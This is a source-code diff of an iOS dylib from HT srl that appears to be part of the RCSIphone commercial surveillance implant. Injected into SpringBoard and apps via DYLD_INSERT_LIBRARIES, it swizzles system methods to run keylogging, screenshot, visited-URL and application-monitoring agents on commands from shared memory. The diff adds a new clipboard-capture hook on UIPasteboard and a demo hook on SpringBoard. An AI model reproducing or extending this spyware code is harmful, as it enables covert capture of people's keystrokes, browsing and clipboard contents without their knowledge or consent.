@@ -17,7 +17,6 @@
  * Copyright (C) HT srl 2009. All rights reserved
  *
  */
-
 #import <UIKit/UIApplication.h>
 #import <objc/runtime.h>
 #import <unistd.h>
@@ -25,6 +24,7 @@
 
 #import <fcntl.h>
 #import <sys/mman.h>
+#import <AudioToolbox/AudioToolbox.h>
 
 #import "RCSILoader.h"
 #import "RCSISharedMemory.h"
@@ -33,6 +33,7 @@
 #import "RCSIAgentInputLogger.h"
 #import "RCSIAgentScreenshot.h"
 #import "RCSIAgentURL.h"
+#import "RCSIAgentPasteboard.h"
 
 #import "ARMHooker.h"
 
@@ -41,9 +42,9 @@
 //#define DEBUG
 
 #define swizzleMethod(c1, m1, c2, m2) do { \
-          method_exchangeImplementations(class_getInstanceMethod(c1, m1), \
-                                         class_getInstanceMethod(c2, m2)); \
-        } while(0)
+method_exchangeImplementations(class_getInstanceMethod(c1, m1), \
+class_getInstanceMethod(c2, m2)); \
+} while(0)
 
 
 //
@@ -74,12 +75,12 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
 {
   const char *name    = sel_getName(_original);
   const char *newName = sel_getName(_newMethod);
-
+  
 #ifdef DEBUG
   NSLog(@"SEL Name: %s", name);
   NSLog(@"SEL newName: %s", newName);
 #endif
-
+  
   Method methodOriginal = class_getInstanceMethod(_class, _original);
   
   if (methodOriginal == nil)
@@ -216,11 +217,43 @@ static void TurnWifiOff(CFNotificationCenterRef center,
   return YES;
 }
 
+#ifdef CORE_DEMO
+- (BOOL)hookingForCoreDemo
+{
+  // lock class for iOS 3/4
+  Class sBUIController = objc_getClass("SBUIController");
+  
+  Class classSource = objc_getClass("RCSILoader");
+  
+#ifdef DEBUG
+  NSLog(@"[DYLIB] %s: sBUIController 0x%x, classSource 0x%x, init 0x%x, initHook 0x%x", 
+        __FUNCTION__, sBUIController, classSource,
+        class_getMethodImplementation(sBUIController, @selector(init)),
+        class_getMethodImplementation(classSource, @selector(initHook)));
+#endif
+  
+  if (sBUIController == nil)
+    return NO;
+  
+  //iOS 3.1.3
+  swizzleByAddingIMP(sBUIController, @selector(init),
+                     class_getMethodImplementation(classSource, @selector(initHook)),
+                     @selector(initHook));
+  
+  
+#ifdef DEBUG
+  NSLog(@"[DYLIB] %s: hooking done", __FUNCTION__);
+#endif
+  
+  return YES;
+}
+#endif
+
 - (void)checkForUninstall
 {
   BOOL isUninstalled = NO;
   NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
-
+  
 #ifdef DEBUG
   NSLog(@"[DYLIB] %s: SB running poll command", __FUNCTION__);
 #endif
@@ -246,7 +279,7 @@ static void TurnWifiOff(CFNotificationCenterRef center,
 #endif
       return;
     }
-  
+
   if ([mSharedMemoryCommand createMemoryRegionForAgent] == -1)
     {
 #ifdef DEBUG
@@ -259,34 +292,34 @@ static void TurnWifiOff(CFNotificationCenterRef center,
     {
       NSMutableData     *readData = nil;
       shMemoryCommand   *shMemCommand;
-    
+
       NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
 
       // Check for uninstall
       readData = [mSharedMemoryCommand readMemory: OFFT_UNINSTALL
-                                    fromComponent: COMP_AGENT]; 
+        fromComponent: COMP_AGENT]; 
       if (readData != nil)
         {
           NSString *libName, *libWithPathname; 
-      
+
 #ifdef DEBUG
           NSLog(@"[DYLIB] %s: command UNINSTALL", __FUNCTION__);
 #endif
           shMemCommand = (shMemoryCommand *)[readData bytes];
-          
+
           if (shMemCommand->command == AG_UNINSTALL)
             {
               libName = [[NSString alloc] initWithBytes: shMemCommand->commandData 
                                                  length: shMemCommand->commandDataSize 
                                                encoding: NSASCIIStringEncoding];
-              
+
               libWithPathname = [[NSString alloc] initWithFormat: @"/usr/lib/%@", libName];
               char *dylibStr = getenv("DYLD_INSERT_LIBRARIES");
-              
+
 #ifdef DEBUG
               NSLog(@"[DYLIB] %s: dylib name %@", __FUNCTION__, libWithPathname);
 #endif         
-            
+
               if (dylibStr != NULL)
                 {
                   NSString *dylibNSStr = [[NSString alloc] initWithBytes: dylibStr 
@@ -296,7 +329,7 @@ static void TurnWifiOff(CFNotificationCenterRef center,
                   NSLog(@"[DYLIB] %s:envs %s", __FUNCTION__, dylibStr);
 #endif
                   NSRange dlRange = [dylibNSStr rangeOfString: libWithPathname];
-                  
+
                   if (dlRange.location  != NSNotFound
                       && dlRange.length != 0) 
                     {
@@ -311,7 +344,7 @@ static void TurnWifiOff(CFNotificationCenterRef center,
                           unsetenv("DYLD_INSERT_LIBRARIES");
 #ifdef DEBUG
                           dylibStr = getenv("DYLD_INSERT_LIBRARIES");
-                          
+
                           if (dylibStr == NULL) 
                             NSLog(@"[DYLIB] %s: unsetted ", 
                                   __FUNCTION__);
@@ -325,7 +358,7 @@ static void TurnWifiOff(CFNotificationCenterRef center,
                           // delete the colon before or after...
                           if (dlRange.location != 0) 
                             dlRange.location--;
-                          
+
                           // remove the colon too
                           dlRange.length++;
 #ifdef DEBUG
@@ -333,10 +366,10 @@ static void TurnWifiOff(CFNotificationCenterRef center,
                                 __FUNCTION__, dlRange.location, dlRange.length);
 #endif        
                           NSMutableString *dylibNSStrOut = [[NSMutableString alloc]
-                                                            initWithString: dylibNSStr];
-                          
+                            initWithString: dylibNSStr];
+
                           [dylibNSStrOut deleteCharactersInRange: dlRange];
-                          
+
                           setenv("DYLD_INSERT_LIBRARIES",
                                  [dylibNSStrOut UTF8String],
                                  [dylibNSStrOut lengthOfBytesUsingEncoding: NSASCIIStringEncoding]);
@@ -347,10 +380,10 @@ static void TurnWifiOff(CFNotificationCenterRef center,
                           [dylibNSStrOut release];
                         }
                     }
-              
+
                   [dylibNSStr release];
                 }
-            
+
               isUninstalled = YES;
               [readData release];
             }
@@ -360,40 +393,40 @@ static void TurnWifiOff(CFNotificationCenterRef center,
       readData = [mSharedMemoryCommand readMemory: OFFT_STANDBY
                                     fromComponent: COMP_AGENT];
       if (readData != nil)
-      {      
+        {      
 
-        shMemCommand = (shMemoryCommand *)[readData bytes];
-        
-        if (stdFlag == 0 && shMemCommand->command == AG_START)
-        {
-          memcpy(&gStandByActions, shMemCommand->commandData, sizeof(standByStruct));
-          
+          shMemCommand = (shMemoryCommand *)[readData bytes];
+
+          if (stdFlag == 0 && shMemCommand->command == AG_START)
+            {
+              memcpy(&gStandByActions, shMemCommand->commandData, sizeof(standByStruct));
+
 #ifdef DEBUG
-          NSLog(@"[DYLIB] %s: start STANDBY swizziling onLock %d, onUnlock %d", 
-                __FUNCTION__, gStandByActions.actionOnLock, gStandByActions.actionOnUnlock);
+              NSLog(@"[DYLIB] %s: start STANDBY swizziling onLock %d, onUnlock %d", 
+                    __FUNCTION__, gStandByActions.actionOnLock, gStandByActions.actionOnUnlock);
 #endif      
-          stdFlag = 1;
-          
-          [self hookingStandByMethods];
-        }
-        else if (stdFlag == 1 && shMemCommand->command == AG_STOP)
-        {
+              stdFlag = 1;
+
+              [self hookingStandByMethods];
+            }
+          else if (stdFlag == 1 && shMemCommand->command == AG_STOP)
+            {
 #ifdef DEBUG
-          NSLog(@"[DYLIB] %s: STANDBY swizziling", __FUNCTION__);
+              NSLog(@"[DYLIB] %s: STANDBY swizziling", __FUNCTION__);
 #endif     
-          stdFlag = 0;
-          
-          gStandByActions.actionOnLock =
-          gStandByActions.actionOnUnlock = CONF_ACTION_NULL;
-          
-          [self hookingStandByMethods];
+              stdFlag = 0;
+
+              gStandByActions.actionOnLock =
+                gStandByActions.actionOnUnlock = CONF_ACTION_NULL;
+
+              [self hookingStandByMethods];
+            }
         }
-      }
-      
+
       [[NSRunLoop currentRunLoop] runUntilDate: [NSDate dateWithTimeIntervalSinceNow: 0.2]];
-      
+
       [innerPool release];
-      
+
       if (isUninstalled) 
         break;
     }
@@ -430,18 +463,18 @@ BOOL triggerStanByAction(UInt32 aAction)
   if ([mSharedMemoryLogging writeMemory: actionData 
                                  offset: 0
                           fromComponent: COMP_AGENT] == TRUE)
-  {
+    {
 #ifdef DEBUG
-    NSLog(@"[DYLIB] %s: triggering action %d", __FUNCTION__, aAction);
+      NSLog(@"[DYLIB] %s: triggering action %d", __FUNCTION__, aAction);
 #endif
-  }
+    }
   else
-  {
+    {
 #ifdef DEBUG_ERRORS
-    NSLog(@"[DYLIB] %s: error triggering action", __FUNCTION__);
+      NSLog(@"[DYLIB] %s: error triggering action", __FUNCTION__);
 #endif
-    retVal=NO;
-  }
+      retVal=NO;
+    }
   
   [actionData release];
   
@@ -449,6 +482,66 @@ BOOL triggerStanByAction(UInt32 aAction)
   
   return retVal;
 }
+
+#ifdef CORE_DEMO
+- (id)initHook
+{
+#ifdef DEBUG
+  NSLog(@"[DYLIB] %s:  initHook called self 0x%x", __FUNCTION__, self);
+#endif
+  
+  if (self)
+    self = [self initHook];
+  
+  if (self == nil)
+    return nil;
+  
+  UIView *content;
+  UIView *window = [self window];
+
+  if ([self contentView])
+    {
+#ifdef DEBUG
+      NSLog(@"[DYLIB] %s: contentView clearColor", __FUNCTION__);
+#endif
+      content = [self contentView];
+      [content setBackgroundColor:[UIColor clearColor]];
+    }
+
+#define CORE_DEMO_BGIMAGE @"/Library/Wallpaper/101.jpg"
+  
+  NSString *path = [[NSString alloc] initWithString: CORE_DEMO_BGIMAGE];
+  
+  UIImage *image;
+  
+  if (path != nil) 
+    {
+      image = [[UIImage alloc] initWithContentsOfFile:path];
+
+      if (image != nil)
+        image = [image autorelease];
+    }
+  else 
+    image = nil;
+  
+  if (image != nil)// && [[window subviews] count]) 
+    {
+#ifdef DEBUG
+      NSLog(@"[DYLIB] %s: insertSubview WallpaperImage_", __FUNCTION__);
+      NSArray *sbv = [window subviews];
+
+      if (sbv)
+        NSLog(@"[DYLIB] %s: subviews %@", __FUNCTION__, sbv);
+#endif
+      UIImageView *WallpaperImage_ = [[UIImageView alloc] initWithImage:image];
+
+      [WallpaperImage_ setAlpha: 0.99];
+      [window insertSubview:WallpaperImage_ atIndex:0];
+    }
+  
+  return self;
+}
+#endif
 
 // Hook for stanby events
 - (void)lockWithTypeHook:(int)aInteger disableLockSound: (BOOL)aBool
@@ -498,7 +591,7 @@ BOOL triggerStanByAction(UInt32 aAction)
 {
   [self lockBarUnlocked2Hook: aValue];
   
- triggerStanByAction(gStandByActions.actionOnUnlock);
+  triggerStanByAction(gStandByActions.actionOnUnlock);
   
 #ifdef DEBUG
   NSLog(@"[DYLIB] %s: lockBarUnlockedHook called", __FUNCTION__);
@@ -510,7 +603,7 @@ BOOL triggerStanByAction(UInt32 aAction)
   NSMutableDictionary *agentConfiguration;
   
   NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
-
+  
   //
   // Here we need to start the loop for checking and reading any configuration
   // change made on the shared memory
@@ -555,9 +648,9 @@ BOOL triggerStanByAction(UInt32 aAction)
     {
       NSMutableData     *readData = nil;
       shMemoryCommand   *shMemCommand;
-    
+
       NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
-      
+
       if ([mSharedMemoryCommand isShMemValid] == NO ||
           [mSharedMemoryLogging isShMemValid] == NO)
         {
@@ -577,40 +670,40 @@ BOOL triggerStanByAction(UInt32 aAction)
 #endif
             }
         }
-    
+
       // Silly Code but it's faster than a switch/case inside a loop
       readData = [mSharedMemoryCommand readMemory: OFFT_SCREENSHOT
                                     fromComponent: COMP_AGENT];
-      
+
       if (readData != nil)
         {
 #ifdef DEBUG_VERBOSE_1
           NSLog(@"[DYLIB] %s: command = %@", __FUNCTION__, readData);
 #endif
           shMemCommand = (shMemoryCommand *)[readData bytes];
-        
+
           if (scrFlag == 0
               && shMemCommand->command == AG_START)
             {
 #ifdef DEBUG
               NSLog(@"[DYLIB] %s: Started Screenshot Agent", __FUNCTION__);
 #endif
-              
+
               scrFlag = 1;
-              
+
               NSData *agentData = [[NSData alloc] initWithBytes: shMemCommand->commandData 
-                                                         length: shMemCommand->commandDataSize];
-             
+                length: shMemCommand->commandDataSize];
+
               agentConfiguration = [[NSMutableDictionary alloc] init];
-              
+
               [agentConfiguration setObject: AGENT_START 
-                                     forKey: @"status"];
+                forKey: @"status"];
               [agentConfiguration setObject: agentData 
-                                     forKey: @"data"];
-              
+                forKey: @"data"];
+
               RCSIAgentScreenshot *scrAgent = [RCSIAgentScreenshot sharedInstance];
               [scrAgent setAgentConfiguration: agentConfiguration];
-            
+
               [agentConfiguration release];
             }
           else if ((scrFlag == 1 || scrFlag == 2)
@@ -618,21 +711,21 @@ BOOL triggerStanByAction(UInt32 aAction)
             {
               scrFlag = 3;
             }
-          
+
           [readData release];
         }
-    
+
       readData = [mSharedMemoryCommand readMemory: OFFT_URL
                                     fromComponent: COMP_AGENT];
-      
+
       if (readData != nil)
         {
 #ifdef DEBUG_VERBOSE_1
           NSLog(@"[DYLIB] %s: command = %@", __FUNCTION__, readData);
 #endif
-          
+
           shMemCommand = (shMemoryCommand *)[readData bytes];
-          
+
           if (urlFlag == 0
               && shMemCommand->command == AG_START)
             {
@@ -648,64 +741,64 @@ BOOL triggerStanByAction(UInt32 aAction)
 #ifdef DEBUG
               NSLog(@"[DYLIB] %s: Stopping Agent URL", __FUNCTION__);
 #endif
-              
+
               urlFlag = 3;
             }
-          
+
           [readData release];
         }
-      
-    readData = [mSharedMemoryCommand readMemory: OFFT_APPLICATION
-                                  fromComponent: COMP_AGENT];
-    
-    if (readData != nil)
-      {
-#ifdef DEBUG_VERBOSE_1
-          NSLog(@"[DYLIB] %s: command = %@", __FUNCTION__, readData);
-#endif
-      
-      shMemCommand = (shMemoryCommand *)[readData bytes];
-      
-      if (appFlag == 0
-          && shMemCommand->command == AG_START)
-        {
-#ifdef DEBUG
-          NSLog(@"[DYLIB] %s: Starting Agent Application", __FUNCTION__);
-#endif
-        
-          appFlag = 1;
-        }
-      else if ((appFlag == 1 || appFlag == 2)
-               && shMemCommand->command == AG_STOP)
-        {
-#ifdef DEBUG
-          NSLog(@"[DYLIB] %s: Stopping Agent Application", __FUNCTION__);
-#endif
-        
-          appFlag = 3;
-        }
-      
-        [readData release];
-      }
-    
-      readData = [mSharedMemoryCommand readMemory: OFFT_KEYLOG
+
+      readData = [mSharedMemoryCommand readMemory: OFFT_APPLICATION
                                     fromComponent: COMP_AGENT];
-      
+
       if (readData != nil)
         {
 #ifdef DEBUG_VERBOSE_1
           NSLog(@"[DYLIB] %s: command = %@", __FUNCTION__, readData);
 #endif
-      
+
           shMemCommand = (shMemoryCommand *)[readData bytes];
-      
+
+          if (appFlag == 0
+              && shMemCommand->command == AG_START)
+            {
+#ifdef DEBUG
+              NSLog(@"[DYLIB] %s: Starting Agent Application", __FUNCTION__);
+#endif
+
+              appFlag = 1;
+            }
+          else if ((appFlag == 1 || appFlag == 2)
+                   && shMemCommand->command == AG_STOP)
+            {
+#ifdef DEBUG
+              NSLog(@"[DYLIB] %s: Stopping Agent Application", __FUNCTION__);
+#endif
+
+              appFlag = 3;
+            }
+
+          [readData release];
+        }
+
+      readData = [mSharedMemoryCommand readMemory: OFFT_KEYLOG
+                                    fromComponent: COMP_AGENT];
+
+      if (readData != nil)
+        {
+#ifdef DEBUG_VERBOSE_1
+          NSLog(@"[DYLIB] %s: command = %@", __FUNCTION__, readData);
+#endif
+
+          shMemCommand = (shMemoryCommand *)[readData bytes];
+
           if (keyboardFlag == 0
               && shMemCommand->command == AG_START)
             {
 #ifdef DEBUG
               NSLog(@"[DYLIB] %s: Starting Agent Keylog", __FUNCTION__);
 #endif
-              
+
               keyboardFlag = 1;
             }
           else if ((keyboardFlag == 1 || keyboardFlag == 2)
@@ -714,22 +807,55 @@ BOOL triggerStanByAction(UInt32 aAction)
 #ifdef DEBUG
               NSLog(@"[DYLIB] %s: Stopping Agent Keylog", __FUNCTION__);
 #endif
-              
+
               keyboardFlag = 3;
             }
-          
+
           [readData release];
         }
-    
+
+      readData = [mSharedMemoryCommand readMemory: OFFT_CLIPBOARD
+                                    fromComponent: COMP_AGENT];
+
+      if (readData != nil)
+        {
+#ifdef DEBUG
+          NSLog(@"[DYLIB] %s: command = %@", __FUNCTION__, readData);
+#endif
+
+          shMemCommand = (shMemoryCommand *)[readData bytes];
+
+          if (clipboardFlag == 0
+              && shMemCommand->command == AG_START)
+            {
+#ifdef DEBUG
+              NSLog(@"[DYLIB] %s: Starting Agent clipboard", __FUNCTION__);
+#endif
+
+              clipboardFlag = 1;
+            }
+          else if ((clipboardFlag == 1 || clipboardFlag == 2)
+                   && shMemCommand->command == AG_STOP)
+            {
+#ifdef DEBUG
+              NSLog(@"[DYLIB] %s: Stopping Agent clipboard", __FUNCTION__);
+#endif
+
+              clipboardFlag = 3;
+            }
+
+          [readData release];
+        }
+
       if (scrFlag == 1)
         {
           scrFlag = 2;
           RCSIAgentScreenshot *scrAgent = [RCSIAgentScreenshot sharedInstance];
-          
+
           [NSThread detachNewThreadSelector: @selector(start)
                                    toTarget: scrAgent
                                  withObject: nil];
-          
+
 #ifdef DEBUG
           NSLog(@"[DYLIB] %s: Started screenshot Agent", __FUNCTION__);
 #endif
@@ -738,24 +864,24 @@ BOOL triggerStanByAction(UInt32 aAction)
         {
           scrFlag = 0;
           RCSIAgentScreenshot *scrAgent = [RCSIAgentScreenshot sharedInstance];
-        
+
           [scrAgent stop];
 #ifdef DEBUG
           NSLog(@"[DYLIB] %s: Stopped Agent Screenshot", __FUNCTION__);
 #endif
         }
-      
+
       if (urlFlag == 1)
         {
           urlFlag = 2;
-          
+
 #ifdef DEBUG
           NSLog(@"Hooking URLs");
 #endif
-          
+
           Class className   = objc_getClass("TabController");
           Class classSource = objc_getClass("myTabController");
-          
+
           if (className != nil)
             {
               swizzleByAddingIMP (className, @selector(tabDocumentDidUpdateURL:),
@@ -772,13 +898,13 @@ BOOL triggerStanByAction(UInt32 aAction)
       else if (urlFlag == 3)
         {
           urlFlag = 0;
-          
+
 #ifdef DEBUG
           NSLog(@"Unhooking URLs");
 #endif
-          
+
           Class className = objc_getClass("TabController");
-          
+
           if (className != nil)
             {
               swizzleByAddingIMP (className, @selector(tabDocumentDidUpdateURL:),
@@ -793,45 +919,45 @@ BOOL triggerStanByAction(UInt32 aAction)
             }
         }
 
-    if (appFlag == 1)
-      {
-        appFlag = 2;
-      
-        RCSIAgentApplication *appAgent = [RCSIAgentApplication sharedInstance];
-      
-        [appAgent start];
-        
+      if (appFlag == 1)
+        {
+          appFlag = 2;
+
+          RCSIAgentApplication *appAgent = [RCSIAgentApplication sharedInstance];
+
+          [appAgent start];
+
 #ifdef DEBUG
-        NSLog(@"Hooking Application");
-#endif
-  
-      }
-    else if (appFlag == 3)
-      {
-        appFlag = 0;
-        RCSIAgentApplication *appAgent = [RCSIAgentApplication sharedInstance];
-      
-        [appAgent stop];
-        
-#ifdef DEBUG
-        NSLog(@"Stopping Application");
+          NSLog(@"Hooking Application");
 #endif
 
-      }
-    
+        }
+      else if (appFlag == 3)
+        {
+          appFlag = 0;
+          RCSIAgentApplication *appAgent = [RCSIAgentApplication sharedInstance];
+
+          [appAgent stop];
+
+#ifdef DEBUG
+          NSLog(@"Stopping Application");
+#endif
+
+        }
+
       if (keyboardFlag == 1)
         {
           keyboardFlag = 2;
-          
+
 #ifdef DEBUG
           NSLog(@"Hooking Keystrokes");
 #endif
-          
+
           Class className   = objc_getClass("UINavigationItem");
           Class classSource = objc_getClass("myUINavigationItem");
-        
+
           gLogger = [[RCSIKeyLogger alloc] init];
-          
+
           if (className != nil)
             {
               swizzleByAddingIMP (className, @selector(setTitle:),
@@ -844,7 +970,7 @@ BOOL triggerStanByAction(UInt32 aAction)
               NSLog(@"Not the right application, skipping");
 #endif
             }
-          
+
           [[NSNotificationCenter defaultCenter] addObserver: gLogger
                                                    selector: @selector(keyPressed:)
                                                        name: UITextFieldTextDidChangeNotification
@@ -857,13 +983,13 @@ BOOL triggerStanByAction(UInt32 aAction)
       else if (keyboardFlag == 3)
         {
           keyboardFlag = 0;
-          
+
 #ifdef DEBUG
           NSLog(@"Unhooking Keystrokes");
 #endif
-          
+
           Class className = objc_getClass("UINavigationItem");
-          
+
           if (className != nil)
             {
               swizzleByAddingIMP (className, @selector(setTitle:),
@@ -876,7 +1002,7 @@ BOOL triggerStanByAction(UInt32 aAction)
               NSLog(@"Not the right application, skipping");
 #endif
             }
-        
+
           [[NSNotificationCenter defaultCenter] removeObserver: gLogger
                                                           name: UITextFieldTextDidChangeNotification
                                                         object: nil];
@@ -885,9 +1011,57 @@ BOOL triggerStanByAction(UInt32 aAction)
                                                         object: nil];
           [gLogger release];
         }
-      
+
+      if (clipboardFlag == 1)
+        {
+          clipboardFlag = 2;
+
+#ifdef DEBUG
+          NSLog(@"Hooking pasteboard");
+#endif
+
+          Class className   = objc_getClass("UIPasteboard");
+          Class classSource = objc_getClass("myUIPasteboard");
+
+          if (className != nil)
+            {
+              swizzleByAddingIMP (className, @selector(addItems:),
+                                  class_getMethodImplementation(classSource, @selector(addItemsHook:)),
+                                  @selector(addItemsHook:));
+            }
+          else
+            {
+#ifdef DEBUG
+              NSLog(@"Not the right application, skipping");
+#endif
+            }
+        }
+      else if (clipboardFlag == 3)
+        {
+          clipboardFlag = 0;
+
+#ifdef DEBUG
+          NSLog(@"Unhooking pasteboard");
+#endif
+
+          Class className = objc_getClass("UIPasteboard");
+
+          if (className != nil)
+            {
+              swizzleByAddingIMP (className, @selector(addItems:),
+                                  class_getMethodImplementation(className, @selector(addItemsHook:)),
+                                  @selector(addItemsHook:));
+            }
+          else
+            {
+#ifdef DEBUG
+              NSLog(@"Not the right application, skipping");
+#endif
+            }
+        }
+
       [[NSRunLoop currentRunLoop] runUntilDate: [NSDate dateWithTimeIntervalSinceNow: 0.2]];
-    
+
       [innerPool release];
     }
   
@@ -900,11 +1074,15 @@ BOOL triggerStanByAction(UInt32 aAction)
 {
   NSString *execName = [[NSBundle mainBundle] bundleIdentifier];
   
+#ifdef DEBUG
+  NSLog(@"[DYLIB] %s: execName %@", __FUNCTION__, execName);
+#endif
+  
   if ([execName compare: SPRINGBOARD] == NSOrderedSame)
     {
       [NSThread detachNewThreadSelector: @selector(checkForUninstall)
-                               toTarget: self
-                             withObject: nil];
+        toTarget: self
+        withObject: nil];
 
       // Install a callback in order to be able to force wifi on and off
       // before/after syncing
@@ -924,15 +1102,18 @@ BOOL triggerStanByAction(UInt32 aAction)
     }
   else
     {
+#ifdef DEBUG
+      NSLog(@"[DYLIB] %s: not SB don't hooking", __FUNCTION__);
+#endif
       [NSThread detachNewThreadSelector: @selector(communicateWithCore)
-                               toTarget: self
-                             withObject: nil];
+        toTarget: self
+        withObject: nil];
     }
 }
 
 - (void)stopCoreCommunicator
 {
-
+  
 }
 
 - (id)init
@@ -941,7 +1122,7 @@ BOOL triggerStanByAction(UInt32 aAction)
   
   if (self != nil)
     {
-       mMainThreadRunning = YES;
+      mMainThreadRunning = YES;
     }
 }
 
@@ -954,21 +1135,34 @@ extern "C" void RCSIInit ()
   NSString *bundleIdentifier  = [[NSBundle mainBundle] bundleIdentifier];
   
 #ifdef DEBUG
-  NSLog (@"RCSIphone loaded by %@ @ %@", bundleIdentifier,
+  NSLog (@"[DYLIB] %s: RCSIphone loaded by %@ @ %@", __FUNCTION__, bundleIdentifier,
          [[NSBundle mainBundle] bundlePath]);
 #endif
-    
+  
   RCSILoader *loader = [[RCSILoader alloc] init];
+  
+#ifdef CORE_DEMO
+  if ([bundleIdentifier compare: SPRINGBOARD] == NSOrderedSame)
+    {
+#ifdef DEBUG
+      NSLog(@"[DYLIB] %s: SB hooking init", __FUNCTION__);
+#endif
+
+      AudioServicesPlaySystemSound(1304);
+
+      [loader hookingForCoreDemo];
+    }
+#endif
   
   [[NSNotificationCenter defaultCenter] addObserver: loader
                                            selector: @selector(startCoreCommunicator)
                                                name: UIApplicationDidFinishLaunchingNotification
                                              object: nil];
   /*
-  [[NSNotificationCenter defaultCenter] addObserver: loader
-                                           selector: @selector(stopCoreCommunicator)
-                                               name: UIApplicationWillTerminateNotification
-                                             object: nil];
-  */
+   [[NSNotificationCenter defaultCenter] addObserver: loader
+   selector: @selector(stopCoreCommunicator)
+   name: UIApplicationWillTerminateNotification
+   object: nil];
+   */
   [pool drain];
 }
